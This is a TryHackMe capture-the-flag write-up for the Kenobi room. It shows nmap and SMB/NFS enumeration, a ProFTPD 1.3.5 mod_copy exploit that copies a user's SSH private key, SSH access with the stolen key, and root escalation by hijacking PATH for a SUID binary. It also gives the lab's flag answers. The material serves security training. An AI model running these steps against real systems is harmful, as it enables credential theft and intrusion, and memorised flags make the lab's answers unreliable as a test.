# TryHackMe - Kenobi Room Write-up (06/26/25)

## 👤 User: sivaaditya

## 💻 IP: 10.10.200.231

---

## 🧩 Task 1: Initial Scanning

### Q: How many ports are open?

**A:** 7

### Nmap Command Used:

```bash
sudo nmap -vv -sV -oN nmap/initial.txt 10.10.200.231
```

### Open Ports:

```
21/tcp - ProFTPD 1.3.5
22/tcp - OpenSSH 7.2p2
80/tcp - Apache 2.4.18
111/tcp - rpcbind
139/tcp - Samba smbd 3.X - 4.X
445/tcp - Samba smbd 3.X - 4.X
2049/tcp - nfs
```

---

## 🧩 Task 2: Enumerating Shares

### Q: How many shares found?

**A:** 3

### Nmap Share Enum Command:

```bash
sudo nmap -p 445 -Pn --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.200.231 -oN nmap/smbshares.txt
```

### Found Shares:

* `anonymous`
* `print$`
* `IPC$`

### Q: What file can you see in the share?

**A:** `log.txt`

### FTP Port?

**A:** 21

### NFS Mount?

**A:** `/var`

```bash
sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.200.231 -oN networkenum.txt
```

---

## 🧩 Task 3: Exploiting ProFTPD mod\_copy

### Q: FTP Version?

**A:** 1.3.5

### Q: Exploits for ProFTPD 1.3.5?

**A:** 4

### Exploit Used:

* `SITE CPFR /home/kenobi/.ssh/id_rsa`
* `SITE CPTO /var/tmp/id_rsa`

### Mount NFS & Access Private Key:

```bash
sudo mkdir -p /mnt/kenobiNFS
sudo mount 10.10.200.231:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS/tmp
cp /mnt/kenobiNFS/tmp/id_rsa ~/kenobi_id_rsa
chmod 600 ~/kenobi_id_rsa
ssh -i ~/kenobi_id_rsa kenobi@10.10.200.231
```

### Q: Kenobi's User Flag?

**A:** `d0b0f3f53b6caa532a83915e19224899`

---

## 🧩 Task 4: Privilege Escalation (PATH Hijack)

### SUID Binaries:

* `/usr/bin/menu` (Suspicious)

### Q: How many options does menu show?

**A:** 3

### Exploitation Steps:

```bash
echo /bin/sh > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

### Q: Root Flag?

**A:** `177b3cd8562289f37382721c28381f02`

---

## ✅ Summary

* ✔ Enumerated services (FTP, Samba, NFS)
* ✔ Exploited ProFTPD mod\_copy to copy SSH key
* ✔ Mounted NFS to exfil key and SSH as kenobi
* ✔ PrivEsc via PATH hijack in `/usr/bin/menu`
* ✔ Rooted the box 💀

---

## 🔗 Room Link:

[TryHackMe: Kenobi](https://tryhackme.com/room/kenobi)

## 🚀 Skills Used:

* Enumeration (nmap, smbclient, rpc, nfs)
* Exploitation (ProFTPD mod\_copy)
* SSH Key Abuse
* PATH Hijack in SUID Binary

---

🛡️ *Write-up by sivaaditya | Date: 06/26/25*

---
